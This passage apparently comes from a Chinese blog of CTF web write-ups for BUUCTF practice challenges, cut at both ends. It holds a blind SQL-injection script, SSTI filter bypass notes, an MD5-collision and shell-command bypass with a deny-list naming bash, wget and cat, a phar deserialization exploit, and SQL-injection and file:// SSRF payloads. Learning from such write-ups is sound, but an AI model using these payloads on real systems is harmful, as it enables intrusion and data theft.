class="string">"?id=1^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='geek'),"</span>+str(i)+<span class="string">",1))&gt;"</span>+str(mid)+<span class="string">")^1"</span></span><br><span class="line">        payload3 = <span class="string">"?id=1^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)='F1naI1y'),"</span>+str(i)+<span class="string">",1))&gt;"</span>+str(mid)+<span class="string">")^1"</span></span><br><span class="line">        payload4 = <span class="string">"?id=1^(ascii(substr((select(group_concat(username,password))from(F1naI1y)),"</span>+str(i)+<span class="string">",1))&gt;"</span>+str(mid)+<span class="string">")^1"</span></span><br><span class="line">        url = <span class="string">"http://40a83957-557e-4e05-ac35-c60063407a0d.node3.buuoj.cn/search.php"</span>+payload4</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"NO!"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">            mid=(low+high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high=mid</span><br><span class="line">        mid=(low+high) // <span class="number">2</span></span><br><span class="line">    DB+=chr(mid)</span><br><span class="line">    print(DB)</span><br></pre></td></tr></table></figure>

<p>这里我自己写的二分法跑的很慢，始终找不到原因，md找了近一个小时才发现把<code>low = mid+1</code>写成了<code>low=low+1</code>看了以后写脚本真的要仔细，不然这一下午又浪费了。。。</p>
<h1 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h1><p>这个题为python的flask框架，进去得到源码 </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line"></span><br><span class="line">app.config[<span class="string">'FLAG'</span>] = os.environ.pop(<span class="string">'FLAG'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(__file__).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/shrine/&lt;path:shrine&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span><span class="params">(shrine)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">        s = s.replace(<span class="string">'('</span>, <span class="string">''</span>).replace(<span class="string">')'</span>, <span class="string">''</span>)</span><br><span class="line">        blacklist = [<span class="string">'config'</span>, <span class="string">'self'</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">''</span>.join([<span class="string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span>.format(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>我们可以在shrine目录下测试。<br><img src="/2020/04/08/BUU-Web3/4.png" alt><br>源码app.config[‘FLAG’] = os.environ.pop(‘FLAG’)<br>推测可查看所有app.config内容，但是这题设了黑名单[‘config’,‘self’]并且过滤了括号<br>不过python还有一些内置函数，比如url_for和get_flashed_messages</p>

<p><img src="/2020/04/08/BUU-Web3/5.png" alt></p>


<p><img src="/2020/04/08/BUU-Web3/6.png" alt><br>然后看到了current_app意思应该是当前app，那我们就当前app下的config<br><img src="/2020/04/08/BUU-Web3/7.png" alt><br><code></code>就得到flag了<br><img src="/2020/04/08/BUU-Web3/8.png" alt></p>
<p>参考链接：<br><a href="https://www.cnblogs.com/wangtanzhi/p/12238779.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangtanzhi/p/12238779.html</a><br><a href="https://www.jianshu.com/p/aef2ae0498df" target="_blank" rel="noopener">https://www.jianshu.com/p/aef2ae0498df</a></p>
<h1 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="[安洵杯 2019]easy_web"></a>[安洵杯 2019]easy_web</h1><p>进入题目发现一串base64加密，然后经过两次base64解码得到十六进制，转成字符串为<code>555.png</code><br>然后我们通过这个加密顺序逆向读取index.php。然后解码得到index.php源码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'img'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>])) </span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'img'</span>])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>, <span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/flag/i"</span>, $file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"xixiï½ no flag"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span> . $txt . <span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"forbid ~"</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">"md5 is funny ~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>因为使用了类型强制转换，所以这里使用<a href="https://evi0s.com/2019/02/09/md5-collisions/" target="_blank" rel="noopener">强类型MD5碰撞</a>绕过md5。</p>
<blockquote>
<p> POST:</p>
 <figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">a=<span class="symbol">%4</span>d<span class="symbol">%c9</span><span class="symbol">%68</span><span class="symbol">%ff</span><span class="symbol">%0</span>e<span class="symbol">%e3</span><span class="symbol">%5</span><span class="keyword">c</span><span class="symbol">%20</span><span class="symbol">%95</span><span class="symbol">%72</span><span class="symbol">%d4</span><span class="symbol">%77</span><span class="symbol">%7</span>b<span class="symbol">%72</span><span class="symbol">%15</span><span class="symbol">%87</span><span class="symbol">%d3</span><span class="symbol">%6</span>f<span class="symbol">%a7</span><span class="symbol">%b2</span><span class="symbol">%1</span>b<span class="symbol">%dc</span><span class="symbol">%56</span><span class="symbol">%b7</span><span class="symbol">%4</span>a<span class="symbol">%3</span>d<span class="symbol">%c0</span><span class="symbol">%78</span><span class="symbol">%3</span>e<span class="symbol">%7</span>b<span class="symbol">%95</span><span class="symbol">%18</span><span class="symbol">%af</span><span class="symbol">%bf</span><span class="symbol">%a2</span><span class="symbol">%00</span><span class="symbol">%a8</span><span class="symbol">%28</span><span class="symbol">%4</span>b<span class="symbol">%f3</span><span class="symbol">%6</span>e<span class="symbol">%8</span>e<span class="symbol">%4</span>b<span class="symbol">%55</span><span class="symbol">%b3</span><span class="symbol">%5</span>f<span class="symbol">%42</span><span class="symbol">%75</span><span class="symbol">%93</span><span class="symbol">%d8</span><span class="symbol">%49</span><span class="symbol">%67</span><span class="symbol">%6</span>d<span class="symbol">%a0</span><span class="symbol">%d1</span><span class="symbol">%55</span><span class="symbol">%5</span>d<span class="symbol">%83</span><span class="symbol">%60</span><span class="symbol">%fb</span><span class="symbol">%5</span>f<span class="symbol">%07</span><span class="symbol">%fe</span><span class="symbol">%a2</span></span><br><span class="line">&amp;b=<span class="symbol">%4</span>d<span class="symbol">%c9</span><span class="symbol">%68</span><span class="symbol">%ff</span><span class="symbol">%0</span>e<span class="symbol">%e3</span><span class="symbol">%5</span><span class="keyword">c</span><span class="symbol">%20</span><span class="symbol">%95</span><span class="symbol">%72</span><span class="symbol">%d4</span><span class="symbol">%77</span><span class="symbol">%7</span>b<span class="symbol">%72</span><span class="symbol">%15</span><span class="symbol">%87</span><span class="symbol">%d3</span><span class="symbol">%6</span>f<span class="symbol">%a7</span><span class="symbol">%b2</span><span class="symbol">%1</span>b<span class="symbol">%dc</span><span class="symbol">%56</span><span class="symbol">%b7</span><span class="symbol">%4</span>a<span class="symbol">%3</span>d<span class="symbol">%c0</span><span class="symbol">%78</span><span class="symbol">%3</span>e<span class="symbol">%7</span>b<span class="symbol">%95</span><span class="symbol">%18</span><span class="symbol">%af</span><span class="symbol">%bf</span><span class="symbol">%a2</span><span class="symbol">%02</span><span class="symbol">%a8</span><span class="symbol">%28</span><span class="symbol">%4</span>b<span class="symbol">%f3</span><span class="symbol">%6</span>e<span class="symbol">%8</span>e<span class="symbol">%4</span>b<span class="symbol">%55</span><span class="symbol">%b3</span><span class="symbol">%5</span>f<span class="symbol">%42</span><span class="symbol">%75</span><span class="symbol">%93</span><span class="symbol">%d8</span><span class="symbol">%49</span><span class="symbol">%67</span><span class="symbol">%6</span>d<span class="symbol">%a0</span><span class="symbol">%d1</span><span class="symbol">%d5</span><span class="symbol">%5</span>d<span class="symbol">%83</span><span class="symbol">%60</span><span class="symbol">%fb</span><span class="symbol">%5</span>f<span class="symbol">%07</span><span class="symbol">%fe</span><span class="symbol">%a2</span></span><br></pre></td></tr></table></figure>
</blockquote>
<p>然后执行cmd，可以通过ca\t或者sort绕过即可读取flag。<img src="/2020/04/08/BUU-Web3/9.png" alt></p>
<h1 id="CISCN2019Web1-Dropbox"><a href="#CISCN2019Web1-Dropbox" class="headerlink" title="[CISCN2019Web1]Dropbox"></a>[CISCN2019Web1]Dropbox</h1><p>打开是一个登陆界面，注册后登陆发现可以上传文件，并且可以下载，在下载的时候抓包然后就该文件名便可以任意下载文件。<br>直接下载index.php的源码<br><img src="/2020/04/08/BUU-Web3/10.png" alt></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">    header(<span class="string">"Location: login.php"</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_SESSION[<span class="string">'username'</span>]<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"class.php"</span>;</span><br><span class="line">$a = <span class="keyword">new</span> FileList($_SESSION[<span class="string">'sandbox'</span>]);</span><br><span class="line">$a-&gt;Name();</span><br><span class="line">$a-&gt;Size();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>包含了class.php，在下在class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#class.php代码很多，由于上面只实例化了FileList类，所以先只看FileList类的源码</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $files;</span><br><span class="line">    <span class="keyword">private</span> $results;</span><br><span class="line">    <span class="keyword">private</span> $funcs;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        $filenames = scandir($path);</span><br><span class="line"></span><br><span class="line">        $key = array_search(<span class="string">"."</span>, $filenames);</span><br><span class="line">        <span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line">        $key = array_search(<span class="string">".."</span>, $filenames);</span><br><span class="line">        <span class="keyword">unset</span>($filenames[$key]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($filenames <span class="keyword">as</span> $filename) &#123;</span><br><span class="line">            $file = <span class="keyword">new</span> File();</span><br><span class="line">            $file-&gt;open($path . $filename);</span><br><span class="line">            array_push(<span class="keyword">$this</span>-&gt;files, $file);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($func, $args)</span> </span>&#123;</span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, $func);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">       <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $table = <span class="string">'&lt;div id="container" class="container"&gt;&lt;div class="table-responsive"&gt;&lt;table id="table" class="table table-bordered table-hover sm-font"&gt;'</span>;</span><br><span class="line">        $table .= <span class="string">'&lt;thead&gt;&lt;tr&gt;'</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;funcs <span class="keyword">as</span> $func) &#123;</span><br><span class="line">            $table .= <span class="string">'&lt;th scope="col" class="text-center"&gt;'</span> . htmlentities($func) . <span class="string">'&lt;/th&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $table .= <span class="string">'&lt;th scope="col" class="text-center"&gt;Opt&lt;/th&gt;'</span>;</span><br><span class="line">        $table .= <span class="string">'&lt;/thead&gt;&lt;tbody&gt;'</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;results <span class="keyword">as</span> $filename =&gt; $result) &#123;</span><br><span class="line">            $table .= <span class="string">'&lt;tr&gt;'</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($result <span class="keyword">as</span> $func =&gt; $value) &#123;</span><br><span class="line">                $table .= <span class="string">'&lt;td class="text-center"&gt;'</span> . htmlentities($value) . <span class="string">'&lt;/td&gt;'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            $table .= <span class="string">'&lt;td class="text-center" filename="'</span> . htmlentities($filename) . <span class="string">'"&gt;&lt;a href="#" class="download"&gt;涓嬭浇&lt;/a&gt; / &lt;a href="#" class="delete"&gt;鍒犻櫎&lt;/a&gt;&lt;/td&gt;'</span>;</span><br><span class="line">            $table .= <span class="string">'&lt;/tr&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> $table;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>后面再File类中发现了一个文件读取，也许可以利用它来读取flag文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">			<span class="comment">#code. . . . . .</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        unlink(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里发现close()方法可以读取文件，并且在User类中可以调用close()方法，并且在对象销毁是自动调用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $db;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $db;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = $db;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">			<span class="comment">#code. . . . . .</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db-&gt;close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果我们new一个User的对象，在对象销毁时便会调用db-&gt;close()方法。但是db变量没有close()方法，这时便触发了FileList里面的__call魔术方法。这时已经读取了文件，但是没有回显。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($func, $args)</span> </span>&#123;</span><br><span class="line">    array_push(<span class="keyword">$this</span>-&gt;funcs, $func);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于close方法执行后存在results变量里的结果会加入到table变量中被打印出来，所以当__call方法结束时调用__destruct方法便可以打印flag<br>EXP：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">   		 <span class="keyword">public</span> $db;</span><br><span class="line">       &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    	<span class="keyword">public</span> $filename;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    	 <span class="keyword">private</span> $files;</span><br><span class="line">   		 <span class="keyword">private</span> $results;</span><br><span class="line">   		 <span class="keyword">private</span> $funcs;</span><br><span class="line">   	 </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">    	$file = <span class="keyword">new</span> File();</span><br><span class="line">    	$file-&gt;filename = <span class="string">'/flag.txt'</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>($file);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        $filenames = scandir($path);</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line">    @unlink(<span class="string">"2.phar"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"2.phar"</span>);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>);</span><br><span class="line">    $o = <span class="keyword">new</span> User();</span><br><span class="line">    $o-&gt;db = <span class="keyword">new</span> FileList(); </span><br><span class="line">    $phar-&gt;setMetadata($o);</span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"text.txt"</span>, <span class="string">"test"</span>);</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后上传生成的文件，点击删除时抓包，使用phar://读取文件便得到了flag<br><img src="/2020/04/08/BUU-Web3/11.png" alt><br>参考链接：<a href="https://blog.csdn.net/weixin_44077544/article/details/102844554" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44077544/article/details/102844554</a><br>参考链接：<a href="https://www.cnblogs.com/kevinbruce656/p/11316070.html" target="_blank" rel="noopener">https://www.cnblogs.com/kevinbruce656/p/11316070.html</a></p>
<h1 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h1><p>这个题进去是一个登陆框，按照要求join后发现有一个no参数，尝试sql注入。</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">no</span>=<span class="number">0</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,group_concat(<span class="built_in">column_name</span>),<span class="number">3</span>,<span class="number">4</span><span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.<span class="keyword">columns</span><span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span><span class="built_in">table_name</span>=<span class="string">'users'</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p>使用数字型联合注入便可以注出数据<br><img src="/2020/04/08/BUU-Web3/12.png" alt><br>但是并没有得到什么有用的信息，报错信息中有一个unserialize()，猜测应该是反序列化，然后再data中发现了一串序列化后的字符串</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:8</span><span class="selector-pseudo">:"UserInfo"</span><span class="selector-pseudo">:3</span>:&#123;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"name"</span>;<span class="attribute">s</span>:<span class="number">5</span>:<span class="string">"admin"</span>;<span class="attribute">s</span>:<span class="number">3</span>:<span class="string">"age"</span>;<span class="attribute">i</span>:<span class="number">12</span>;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">"blog"</span>;<span class="attribute">s</span>:<span class="number">8</span>:<span class="string">"16ad.com"</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>这时看wp说可以直接使用load_file()函数直接读取flag.php</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">no=<span class="number">999</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select <span class="number">1</span>,load<span class="constructor">_file('<span class="operator">/</span><span class="params">var</span><span class="operator">/</span><span class="params">www</span><span class="operator">/</span><span class="params">html</span><span class="operator">/</span><span class="params">flag</span>.<span class="params">php</span>')</span>,<span class="number">3</span>,<span class="number">4</span> %<span class="number">23</span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/08/BUU-Web3/13.png" alt><br>其中还有源码泄露<code>user.php.bak</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (int)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($url)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $ch = curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        $output = curl_exec($ch);</span><br><span class="line">        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>($httpCode == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $output;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $blog = <span class="keyword">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> preg_match(<span class="string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>里面有一个get方法，这个方法会访问博客url并且返回结果。然后发现getBlogContents方法中调用了get方法，所以我们可以构造</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name = <span class="string">"admin"</span>;</span><br><span class="line">    <span class="keyword">public</span> $age = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> $blog = <span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name, $age, $blog)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age = (int)$age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;blog = $blog;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> <span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;get(<span class="keyword">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> UserInfo();</span><br><span class="line">$a-&gt;blog = <span class="string">"file:///var/www/html/flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> 